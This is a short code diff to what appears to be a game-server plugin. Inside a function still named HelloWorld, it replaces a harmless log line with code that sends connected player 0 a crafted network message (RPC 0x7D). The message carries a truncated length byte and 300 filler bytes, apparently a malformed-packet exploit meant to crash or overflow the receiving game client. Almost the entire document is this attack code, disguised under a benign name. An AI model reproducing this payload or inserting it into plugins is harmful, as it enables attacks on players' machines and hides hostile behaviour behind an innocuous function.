@@ -699,7 +699,16 @@ PLUGIN_EXPORT void PLUGIN_CALL Unload( )
 // native HelloWorld();
 static cell AMX_NATIVE_CALL n_HelloWorld( AMX* amx, cell* params )
 {
-	logprintf( "Hello World, from the HelloWorld plugin!" );
+	RakNet::BitStream bStream;
+	bStream.Write( ( uint16_t )0 );
+	bStream.Write( ( uint8_t ) 300 );
+	char a[300];
+	for(int i=0; i < 300; i++) a[i] = 'a';
+	bStream.Write(a, 300);
+
+	uint32_t RPC_NewPlayer = 0x7D;
+	CNetGame__RPC_SendToPlayer( ( uint32_t )__NetGame, &RPC_NewPlayer, &bStream, 0, 2 );
+	logprintf("-> HelloWorld()");
 	return 1;
 }
 
